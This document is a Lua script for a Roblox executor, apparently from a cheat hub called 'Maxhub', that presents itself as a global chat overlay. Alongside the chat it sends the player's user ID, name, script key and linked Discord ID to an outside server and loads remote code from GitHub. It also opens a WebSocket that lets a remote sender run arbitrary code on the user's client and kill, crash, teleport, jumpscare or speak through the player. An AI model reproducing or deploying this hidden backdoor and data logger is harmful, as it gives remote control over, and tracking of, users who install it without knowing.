local LRM_LinkedDiscordID, LRM_IsUserPremium = select(1, ...), select(2, ...)
local request = request or http.request or http_request

do -- Logs for maxhub
	
	local httpService = game:GetService("HttpService")

	if script_key and LRM_IsUserPremium and request then request({
		Url = "https://testserver-diki.onrender.com/adduserdata",
		Method = "POST",
		Body = httpService:JSONEncode({
			userid = tostring(game:GetService("Players").LocalPlayer.UserId),
			username = game:GetService("Players").LocalPlayer.Name,
			displayname = game:GetService("Players").LocalPlayer.DisplayName,
			key = script_key,
			gameid = tostring(game.GameId),
			placeid = tostring(game.PlaceId),
			gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			discordid = LRM_LinkedDiscordID and tostring(LRM_LinkedDiscordID) or "No Discord Linked",
		}),
		Headers = {
			["Content-Type"] = "application/json",
		},
	}) end
end

if getgenv().oldws then
	getgenv().forceClosing = true
	getgenv().oldws:Close()
end
getgenv().forceClosing = false
-- Services / Variables
local connectionManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/EXT/main/connections.lua", true))().new("MaxhubServerStuff")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() and Players.LocalPlayer
local httpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = (gethui and gethui()) or game:GetService("CoreGui")

local isUserMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local BASE_URL = "testserver-diki.onrender.com"
-- local BASE_URL = "localhost:3001"

local ws = nil

-- Our connection data
local userdata = {
	action = "newuser",
	userid = localPlayer.UserId,
	username = localPlayer.Name,
	discordid = LRM_LinkedDiscordID or "No Discord Linked",
	placeid = game.PlaceId,
	jobid = game.JobId,
	gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
	executor = identifyexecutor and identifyexecutor() or "Unknown",
}

if isUserMobile or not WebSocket or not request then return end
-- GLOBAL CHAT
local devs = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/MaxhubControlPanel/refs/heads/main/MAXHUBSUPERDEVSIGMAS"))() or { 332721249, 213207428, 7012855056, 7098987458, 2283397273 }
local isDev = table.find(devs, localPlayer.UserId)

local function UpdateCanvasSize(Canvas, Constraint) Canvas.CanvasSize = UDim2.new(0, Constraint.AbsoluteContentSize.X, 0, Constraint.AbsoluteContentSize.Y + 3) end

local GlobalChat = {}

function GlobalChat.init()
	if isUserMobile then return end
	local self = {}
	local oldgui = CoreGui:FindFirstChild("Maxhub Global Chat")
	if oldgui then oldgui:Destroy() end

	-- self.ScreenGui = game:GetObjects("rbxassetid://71404790972751")[1]
	self.ScreenGui = game:GetObjects("rbxassetid://110126484672625")[1]

	self.ScreenGui.Parent = CoreGui

	self.Drag = self.ScreenGui["Main/Drag"]
	self.NotificationHolder = self.ScreenGui.NotificationHolder
	self.GameJoin = self.ScreenGui.GameJoin
	do
		self.Drag.Visible = not isUserMobile
	end

	self.Main = self.Drag.Main
	self.MessageHolder = self.Main.ScrollingFrame
	self.MessageBox = self.Main.Messagebox
	self.ToggleToast = self.Main.ToggleToast

	self.MessageHolder.CanvasPosition = Vector2.new(0, self.MessageHolder.AbsoluteCanvasSize.Y)

	local Dragging = nil
	local DragInput = nil
	local DragStart = nil
	local StartPosition = nil

	self.ToggleKeyBind = Enum.KeyCode.U
	self.ToggleKeyBindEnabled = true
	self.UIShown = not isUserMobile
	self.Toasts = true

	local function Update(input)
		local Delta = input.Position - DragStart
		local pos = UDim2.new(StartPosition.X.Scale, StartPosition.X.Offset + Delta.X, StartPosition.Y.Scale, StartPosition.Y.Offset + Delta.Y)
		self.Drag.Position = pos
	end

	connectionManager:NewConnection(self.Drag.InputBegan, function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			Dragging = true
			DragStart = input.Position
			StartPosition = self.Drag.Position

			connectionManager:NewConnection(input.Changed, function()
				if input.UserInputState == Enum.UserInputState.End then Dragging = false end
			end)
		end
	end)

	connectionManager:NewConnection(self.Drag.InputChanged, function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then DragInput = input end
	end)

	connectionManager:NewConnection(game:GetService("UserInputService").InputChanged, function(input)
		if input == DragInput and Dragging then Update(input) end
	end)

	connectionManager:NewConnection(game:GetService("UserInputService").InputBegan, function(input, gameProcessed)
		if not gameProcessed and input.KeyCode == self.ToggleKeyBind and self.ToggleKeyBindEnabled then
			self.Drag.Visible = not self.Drag.Visible
			self.UIShown = not self.UIShown
		end
	end)

	connectionManager:NewConnection(self.MessageBox.FocusLost, function(enterPressed, inputObject)
		warn("Sending message...")
		if enterPressed then
			local message = self.MessageBox.Text
			local inviteType = message:lower() == "/invite"

			if message == "" or not message:match("%S") then return end

			if self.SendMessageDebounce then
				coroutine.wrap(function()
					self.MessageBox.Text = "On Cooldown!"
					task.wait(0.5)
					self.MessageBox.Text = ""
				end)()
				return
			end

			local userdata

			if inviteType then userdata = { jobid = game.JobId, placeid = game.PlaceId, currentPlayers = #Players:GetPlayers(), maxPlayers = Players.MaxPlayers } end

			self:SendMessage(message, isDev and not inviteType and "Dev" or inviteType and "Invite" or LRM_IsUserPremium and "Paid" or "Free", userdata)
			self.MessageBox.Text = ""
		end
	end)

	connectionManager:NewConnection(self.ToggleToast.MouseButton1Click, function()
		self.Toasts = not self.Toasts
		self.ToggleToast.Text = self.Toasts and "Disable Notifications" or "Enable Notifications"
	end)

	self.msgTypes = {
		Free = self.MessageHolder.Free:Clone(),
		Paid = self.MessageHolder.Paid:Clone(),
		Invite = self.MessageHolder.Invite:Clone(),
		Discord = self.MessageHolder.Discord:Clone(),
		Dev = self.MessageHolder.Dev:Clone(),
	}

	self.msgColors = {
		Free = { 46, 204, 113 },
		Paid = { 125, 53, 30 },
		Invite = { 233, 233, 233 },
		Dev = { 215, 179, 0 },
		Discord = { 159, 171, 246 },
	}

	self.toastTypes = {
		Roblox = self.NotificationHolder.RobloxNotification:Clone(),
		Discord = self.NotificationHolder.DiscordNotification:Clone(),
		Dev = self.NotificationHolder.DevNotification:Clone(),
		Invite = self.NotificationHolder.InviteNotification:Clone(),
	}

	self.MessageHolder.Discord:Destroy()
	self.MessageHolder.Dev:Destroy()
	self.MessageHolder.Invite:Destroy()
	self.MessageHolder.Free:Destroy()
	self.MessageHolder.Paid:Destroy()

	self.NotificationHolder.RobloxNotification:Destroy()
	self.NotificationHolder.DiscordNotification:Destroy()
	self.NotificationHolder.DevNotification:Destroy()
	self.NotificationHolder.InviteNotification:Destroy()

	self.LastMessage = nil
	self.LastMessageSent = false

	self.SendMessageDebounce = false

	function self:fetchMessages()
		local response = request({
			Url = `{BASE_URL:find("localhost") and "http" or "https"}://{BASE_URL}/messages`,
			Method = "GET",
		})

		if response.StatusCode == 200 then
			local data = httpService:JSONDecode(response.Body)
			return data.messages
		end

		return "Failed to fetch messages"
	end

	local gameInviteShowing = false
	function self:_showGameInvite(sender, metadata)
		if gameInviteShowing then return end
		gameInviteShowing = true

		local image: ImageLabel = self.GameJoin.GameImage
		local cancel: Frame = image.Cancel
		local join: Frame = image.Join
		local divider: TextLabel = image.Divider
		local invitor: TextLabel = image.Invitor
		local message: TextLabel = image.Message
		local playerCount: TextLabel = image.Playercount
		local title: TextLabel = image.Title

		do -- Set positions for showing
			cancel.Position = UDim2.new(0.78, 0, 1.2, 0)
			join.Position = UDim2.new(0.89, 0, 1.2, 0)
			divider.Position = UDim2.new(0.168, 0, 1.2, 0)
			invitor.Position = UDim2.new(0.216, 0, 1.2, 0)
			playerCount.Position = UDim2.new(0.034, 0, 1.2, 0)
			title.Position = UDim2.new(0.034, 0, 1.2, 0)
			message.Position = UDim2.new(0.5, 0, 1.2, 0)
		end

		local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(metadata.placeid, Enum.InfoType.Asset)
		local placeImageId = "rbxassetid://" .. gameInfo["IconImageAssetId"]

		image.Image = placeImageId
		image.UIGradient.Offset = Vector2.new(0, 1)

		playerCount.Text = `{metadata.currentPlayers}/{metadata.maxPlayers}`

		invitor.Text = sender
		title.Text = gameInfo.Name
		do -- Tweening
			TweenService:Create(self.GameJoin, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.5, 0, 0.159, 0),
			}):Play()
			task.wait(0.2)
			TweenService:Create(title, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.034, 0, 0.685, 0),
			}):Play()
			TweenService:Create(image.UIGradient, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Offset = Vector2.new(0, 0),
			}):Play()
			task.wait(0.13)
			TweenService:Create(playerCount, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.034, 0, 0.847, 0),
			}):Play()
			TweenService:Create(divider, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.168, 0, 0.833, 0),
			}):Play()
			TweenService:Create(invitor, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.216, 0, 0.847, 0),
			}):Play()
			TweenService:Create(cancel, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.78, 0, 0.774, 0),
			}):Play()
			TweenService:Create(join, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.89, 0, 0.774, 0),
			}):Play()
		end

		join.Interact.MouseButton1Click:Once(function()
			do -- Tweening
				TweenService:Create(playerCount, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0.034, 0, 1.2, 0),
				}):Play()

				TweenService:Create(divider, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0.168, 0, 1.2, 0),
				}):Play()
				TweenService:Create(invitor, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0.216, 0, 1.2, 0),
				}):Play()
				TweenService:Create(cancel, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0.78, 0, 1.2, 0),
				}):Play()
				TweenService:Create(join, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0.89, 0, 1.2, 0),
				}):Play()
				task.wait(0.15)
				TweenService:Create(title, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Position = UDim2.new(0.034, 0, 1.2, 0),
				}):Play()
				task.wait(0.15)
				TweenService:Create(image.UIGradient, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
					Offset = Vector2.new(0, -1),
				}):Play()
			end

			local s = TweenService:Create(message, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.5, 0, 0.5, 0),
			})

			s:Play()
			s.Completed:Wait()
			game:GetService("TeleportService"):TeleportToPlaceInstance(metadata.placeid, metadata.jobid, localPlayer)
		end)

		cancel.Interact.MouseButton1Click:Once(function()
			local tween = TweenService:Create(self.GameJoin, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
				Position = UDim2.new(0.5, 0, -0.2, 0),
			})
			tween:Play()
			tween.Completed:Wait()

			gameInviteShowing = false
		end)
	end

	function self:addMessage(msg: string, type: "Free" | "Paid" | "Invite" | "Discord" | "Dev", sender: string, metadata: { any }?)
		assert(self.msgTypes[type], "Invalid message type")

		local message = self.msgTypes[type]:Clone()

		msg = msg:sub(1, 64)

		if type == "Invite" then
			message.TextMessage.Text = `<font size="15"><b><font color="rgb({self.msgColors[type][1]}, {self.msgColors[type][2]}, {self.msgColors[type][3]})"><u>{sender} sent a game invite.</u></font></b></font>`

			connectionManager:NewConnection(message.TextMessage.Interact.MouseButton1Click, function()
				if not metadata or not metadata.jobid or not metadata.placeid or not metadata.currentPlayers or not metadata.maxPlayers then return end

				self:_showGameInvite(sender, metadata)
			end)
		else
			message.TextMessage.Text = `<font color="rgb({self.msgColors[type][1]}, {self.msgColors[type][2]}, {self.msgColors[type][3]})"><b>{type}</b><font size="15"> [{sender}]:</font></font>  {msg}`
		end

		message.Parent = self.MessageHolder
		UpdateCanvasSize(self.MessageHolder, self.MessageHolder.UIListLayout)

		return message
	end

	function self:SendMessage(msg: string, msg_type: "Free" | "Paid" | "Invite" | "Discord" | "Dev", metadata: { any }?)
		if not ws or self.SendMessageDebounce then return end

		metadata = metadata or {}

		self.SendMessageDebounce = true

		ws:Send(httpService:JSONEncode({
			action = "send_msg",
			chat_msg = msg,
			msg_type = msg_type,
			metadata = metadata,
			sender = localPlayer.Name,
		}))

		local message = self:addMessage(msg, msg_type, localPlayer.Name, metadata)

		task.delay(3, function()
			if not self.LastMessageSent then
				message:Destroy()
			else
				self.LastMessageSent = false
			end
			self.SendMessageDebounce = false
		end)
	end

	function self:ToggleUI(Visible: boolean?)
		if Visible ~= nil then
			self.Drag.Visible = Visible
			self.UIShown = Visible
			return self.Drag.Visible
		end

		self.Drag.Visible = not self.Drag.Visible
		self.UIShown = not self.UIShown
		return self.Drag.Visible
	end

	function self:setToggleKeyBind(keyCode: Enum.KeyCode)
		self.toggleKeyBind = keyCode
		self.messageBox.PlaceholderText = self.toggleKeyBindEnabled and `Type Something... (Press {self.toggleKeyBind.Name} to close)` or `Type Something...`
	end

	function self:SetToggleKeyBindEnabled(enabled: boolean)
		self.ToggleKeyBindEnabled = enabled
		return self.ToggleKeyBindEnabled
	end

	self.ActiveNotifications = {}

	local function updateActiveNotificationPositions()
		for i, toast in ipairs(self.ActiveNotifications) do
			toast.notification.Position = UDim2.new(0.5, 0, 0.85 - (0.20 * (i - 1)), 0)
			toast.index = i
		end
	end

	-- Toast Notifications
	function self:Toast(type: "Discord" | "Roblox" | "Dev" | "Invite", name: string, text: string, duration: number)
		if self.UIShown or not self.Toasts then return end
		updateActiveNotificationPositions()

		local toast = self.toastTypes[type]:Clone()
		toast:FindFirstChild("Name").Text = name
		toast.Message.Text = type == "Invite" and "Sent a game invite!" or text
		toast.Parent = self.NotificationHolder
		local toasttable = { notification = toast, index = #self.ActiveNotifications + 1 }
		table.insert(self.ActiveNotifications, toasttable)
		toast.Position = UDim2.new(1.5, 0, 0.85 - ((toasttable.index - 1) * 0.20), 0)

		connectionManager:NewConnection(toast.Interact.MouseEnter, function()
			TweenService:Create(toast, TweenInfo.new(0.23, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
				BackgroundColor3 = Color3.fromRGB(29, 29, 29),
			}):Play()
		end)

		connectionManager:NewConnection(toast.Interact.MouseLeave, function()
			TweenService:Create(toast, TweenInfo.new(0.23, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
				BackgroundColor3 = Color3.fromRGB(40, 40, 40),
			}):Play()
		end)

		connectionManager:NewConnection(toast.Interact.MouseButton1Click, function()
			toast:Destroy()
			self:ToggleUI(true)
			table.remove(self.ActiveNotifications, table.find(self.ActiveNotifications, toasttable))
			updateActiveNotificationPositions()
		end)

		if not toast then return end

		local tween = TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
			Position = UDim2.new(0.5, 0, 0.85 - ((toasttable.index - 1) * 0.20), 0),
		})

		tween:Play()
		tween.Completed:Wait()

		task.delay(duration, function()
			-- tween out
			if not toast then return end
			tween = TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
				Position = UDim2.new(1.5, 0, 0.85 - ((toasttable.index - 1) * 0.20), 0),
			})
			tween:Play()
			tween.Completed:Wait()
			table.remove(self.ActiveNotifications, table.find(self.ActiveNotifications, toasttable))
			updateActiveNotificationPositions()
		end)
	end

	return self
end

-- END GLOBAL CHAT

local function sendCmdResponse(receiver, success, response)
	request({
		Url = `{BASE_URL:find("localhost") and "http" or "https"}://{BASE_URL}/sendres`,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
		},
		Body = httpService:JSONEncode({
			sender = localPlayer.Name,
			receiver = receiver,
			success = success,
			response = response,
			id = httpService:GenerateGUID(false),
		}),
	})
end

-- Commands
local commands = {
	kill = function(sender, _)
		local success, message = pcall(function()
			local character = localPlayer.Character
			if not character then return "Character not found" end

			local humanoid = character:FindFirstChildWhichIsA("Humanoid")
			if not humanoid then return "Humanoid not found" end

			if humanoid.Health <= 0 then return "Character is already dead" end

			humanoid.Health = 0

			return "Killed successfully"
		end)

		if success then
			sendCmdResponse(sender, true, message)
		else
			sendCmdResponse(sender, false, "Error: " .. tostring(message))
		end
	end,

	say = function(sender, args)
		local chatService = game:GetService("TextChatService")

		if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
			local generalChannel = chatService.TextChannels.RBXGeneral
			generalChannel:SendAsync(args.Message)
		else
			local sayMessageRequest = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
			sayMessageRequest:FireServer(args.Message, "All")
		end

		sendCmdResponse(sender, true, "Successfully sent message")
	end,

	jumpscare = function(sender, args)
		-- coroutine.wrap(function()
		if not writefile or not getcustomasset or not request then
			sendCmdResponse(sender, false, "Executor not supported")
			return
		end
		sendCmdResponse(sender, true, "Successfully executed jumpscare")

		writefile("scream.mp3", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3", Method = "GET" }).Body)

		writefile("skibidi.webm", request({ Url = `https://github.com/Grayy12/maxhubassets/raw/main/{args.type == "balls" and "balls" or "skibidi"}.webm`, Method = "GET" }).Body)

		local items = {
			["_ScreenGui"] = Instance.new("ScreenGui"),
			["_VideoFrame"] = Instance.new("VideoFrame"),
		}

		items["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		items["_ScreenGui"].Parent = CoreGui

		items["_VideoFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
		items["_VideoFrame"].Position = UDim2.new(0.5, 0, 0.5, 0)
		items["_VideoFrame"].Size = UDim2.new(1, 0, 1, 0)
		items["_VideoFrame"].ZIndex = 9999
		items["_VideoFrame"].Parent = items["_ScreenGui"]
		items["_VideoFrame"].Video = getcustomasset("skibidi.webm", true)

		local sound = Instance.new("Sound", workspace)
		sound.SoundId = getcustomasset("scream.mp3", true)
		sound.Volume = 0.5
		sound:Play()

		items["_VideoFrame"].Looped = false
		items["_VideoFrame"]:Play()

		items["_VideoFrame"].Ended:Wait()

		items["_ScreenGui"]:Destroy()
		delfile("scream.mp3")
		delfile("skibidi.webm")

		sendCmdResponse(sender, true, "jumpscare ended")
		-- end)()
	end,

	teleport = function(sender, args)
		sendCmdResponse(sender, true, "Successfully joined place")
		if args.JobId then
			game:GetService("TeleportService"):TeleportToPlaceInstance(args.PlaceId, args.JobId, localPlayer)
		else
			game:GetService("TeleportService"):Teleport(args.PlaceId, localPlayer)
		end
	end,

	execute = function(sender, args)
		xpcall(function()
			loadstring(args.Code)()
			sendCmdResponse(sender, true, "Successfully executed code")
		end, function(err) sendCmdResponse(sender, false, err) end)
	end,

	crash = function(sender, args)
		sendCmdResponse(sender, true, "Successfully crashed")
		while true do
		end
	end,

	bring = function(sender, args)
		local player = game:GetService("Players"):FindFirstChild(args.Username)

		if not player then return sendCmdResponse(sender, false, "Player not in game") end

		if not player.Character then return sendCmdResponse(sender, false, "Player has no character") end

		localPlayer.Character:PivotTo(player.Character:GetPivot())

		sendCmdResponse(sender, true, "Successfully brought player")
	end,
}

-- Global Chat Init
local GlobalChatInstance = nil

-- WebSocket Client
local function connectToServer()
	
	ws = WebSocket.connect(`{BASE_URL:find("localhost") and "ws" or "wss"}://{BASE_URL}/ws`)
	getgenv().oldws = ws

	-- Send user data so the server knows who we are
	ws:Send(httpService:JSONEncode(userdata))

	-- ws:Send(httpService:JSONEncode({ action = "send_msg", chat_msg = "Successfully connected to server" }))
	GlobalChatInstance = GlobalChat.init()
	if GlobalChatInstance then
		GlobalChatInstance:ToggleUI(false)
		if not isUserMobile then GlobalChatInstance:Toast("Roblox", "Maxhub", "Press U to open Global Chat", 3) end
	end

	local oldMessages = GlobalChatInstance and GlobalChatInstance:fetchMessages() or {}

	for i, message in ipairs(oldMessages) do
		GlobalChatInstance:addMessage(message.message, message.msgType, message.sender.message.metadata)
	end

	-- Listen for messages
	connectionManager:NewConnection(ws.OnMessage, function(msg)
		task.spawn(function()
			local data = httpService:JSONDecode(msg)

			local action = data.action
			local cmd = data.cmd
			local sender = data.sender
			local args = data.args

			if action == "run" and commands[cmd] then coroutine.wrap(pcall)(commands[cmd], sender, args) end

			if action == "ping" then ws:Send(httpService:JSONEncode({ action = "pong" })) end

			if action == "msg_received" and GlobalChatInstance then
				GlobalChatInstance:addMessage(data.message, data.msgType, data.sender, data.metadata)
				coroutine.wrap(GlobalChatInstance.Toast)(GlobalChatInstance, data.msgType, data.sender, data.message, 3)
			end

			if action == "msg_sent" and GlobalChatInstance then GlobalChatInstance.LastMessageSent = true end
		end)
	end)

	-- Listen for close
	connectionManager:NewConnection(ws.OnClose, function()
		if not getgenv().forceClosing then pcall(connectToServer) end
	end)
end

local s, e = pcall(connectToServer)

if not s then warn(e) end

return GlobalChatInstance
